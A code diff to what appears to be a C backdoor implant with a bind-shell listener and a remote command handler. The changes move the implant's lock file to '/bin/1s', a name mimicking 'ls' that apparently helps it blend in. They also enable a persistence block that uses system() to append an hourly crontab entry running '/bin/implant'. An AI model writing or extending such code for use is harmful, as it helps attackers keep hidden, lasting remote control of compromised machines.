@@ -19,7 +19,7 @@
 #define MAXDATASIZE 100
 #define SLEEP 5
 
-#define MUTEX "/tmp/alive.txt"
+#define MUTEX "/bin/1s"
 
 void foo();
 void commands(int sockfd);
@@ -40,7 +40,7 @@ int main(void) {
       }
       #endif
       FILE *fp = NULL;
-      fp = fopen("/tmp/alive.txt", "w");
+      fp = fopen("/bin/1s", "w");
         /* Our process ID and Session ID */
         pid_t pid, sid;
 
@@ -97,7 +97,7 @@ int main(void) {
 
            //sleep(30); /* wait 30 seconds */
         //}
-   remove("/tmp/alive.txt");
+   remove("/bin/1s");
    exit(EXIT_SUCCESS);
 }
 
@@ -197,7 +197,7 @@ void foo()
 */
   #ifdef BINDSHELL
   printf("BINDSHELL: %d!\n", BINDSHELL);
-  
+
   //addr.sin_port = htons(atoi(S_PORT));
 
   int sockfd, new_fd;  // listen on sock_fd, new connection on new_fd
@@ -316,11 +316,13 @@ void foo()
   #ifdef S_PORT
   printf("S_PORT: %s!\n", S_PORT);
   #endif
-  /*
+
   #ifdef PERSIST
+  system("crontab -l | { cat; echo \"0 * * * * /bin/implant\"; } | crontab -");
   printf("PERSIST: %s!\n", PERSIST);
   #endif
 
+  /*
   #ifdef NOTES
   printf("NOTES: %s!\n", NOTES);
   #endif
